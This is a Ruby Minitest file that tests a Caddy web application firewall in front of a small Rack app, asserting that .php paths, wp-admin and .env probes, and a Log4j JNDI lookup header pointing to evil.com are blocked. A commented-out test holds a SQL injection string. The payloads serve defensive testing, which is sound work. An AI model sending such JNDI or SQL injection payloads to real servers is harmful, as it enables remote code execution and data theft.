require 'minitest/autorun'
require 'net/http'
require 'uri'

class TestWAFFunctionality < Minitest::Test
  def setup
    @ruby_port = find_available_port
    @caddy_port = find_available_port

    # Start Ruby/Rack app on available port
    start_ruby_server

    # Start Caddy proxy server
    start_caddy_server

    # Wait for servers to be ready
    wait_for_caddy_ready
  end

  def teardown
    cleanup_servers
  end

  def test_waf_blocks_php_files
    # Test that .php file requests are blocked by WAF (rule 100001)
    response = make_request('/test.php')
    assert_equal '403', response.code, "PHP file access should be blocked by WAF"

    response = make_request('/admin.php')
    assert_equal '403', response.code, "PHP file access should be blocked by WAF"
  end

  def test_waf_blocks_penetration_probes
    # Test that wp-admin and similar paths are blocked (rule 100002)
    response = make_request('/wp-admin/')
    assert_equal '403', response.code, "wp-admin access should be blocked by WAF"

    response = make_request('/.env')
    assert_equal '403', response.code, ".env file access should be blocked by WAF"
  end

  def test_waf_blocks_log4j_injection
    # Test that Log4j injection attempts are blocked (rule 100003)
    response = make_request('/', {'User-Agent' => '${jndi:ldap://evil.com/a}'})
    assert_equal '403', response.code, "Log4j injection should be blocked by WAF"
  end

  # def test_waf_blocks_sql_injection
  #   # Test that SQL injection in URL parameters is blocked (rule 100004)
  #   response = make_request("/?id=1' OR 1=1--")
  #   assert_equal '403', response.code, "SQL injection should be blocked by WAF"
  # end

  private

  def find_available_port
    server = TCPServer.new('127.0.0.1', 0)
    port = server.addr[1]
    server.close
    port
  end

  def start_ruby_server
    require_relative 'app'
    require 'webrick'

    @ruby_server_thread = Thread.new do
      @ruby_server = WEBrick::HTTPServer.new(
        Port: @ruby_port,
        Logger: WEBrick::Log.new('/dev/null'),
        AccessLog: []
      )
      @ruby_server.mount '/', WEBrick::HTTPServlet::ProcHandler.new(proc { |req, res|
        env = {}
        env['REQUEST_METHOD'] = req.request_method
        env['PATH_INFO'] = req.path_info
        env['QUERY_STRING'] = req.query_string || ''
        env['HTTP_HOST'] = req.header['host'].first if req.header['host']

        status, headers, body = App.new.call(env)
        res.status = status
        headers.each { |k, v| res[k] = v }
        res.body = body.join
      })
      @ruby_server.start
    end
  end

  def start_caddy_server
    @caddy_thread = Thread.new do
      ENV['PORT'] = @caddy_port.to_s
      ENV['RUBY_PORT'] = @ruby_port.to_s
      system("../dist/caddy-darwin-arm64 run --config Caddyfile --adapter caddyfile > /dev/null 2>&1")
    end
  end

  def wait_for_caddy_ready
    30.times do
      begin
        # Test a request that should be blocked to confirm WAF is active
        response = make_request('/test.php')
        if response.code == '403'
          return true  # WAF is working
        end
      rescue
        # Server not ready yet
      end
      sleep 0.5
    end
    raise "Caddy server with WAF failed to start"
  end

  def cleanup_servers
    @ruby_server&.shutdown
    @ruby_server_thread&.kill

    system("pkill -f 'caddy.*run.*Caddyfile' > /dev/null 2>&1")
    @caddy_thread&.kill
    sleep 0.5
  end

  def make_request(path, headers = {})
    uri = URI("http://localhost:#{@caddy_port}#{path}")
    http = Net::HTTP.new(uri.host, uri.port)
    request = Net::HTTP::Get.new(uri)
    headers.each { |k, v| request[k] = v }
    http.request(request)
  end
end
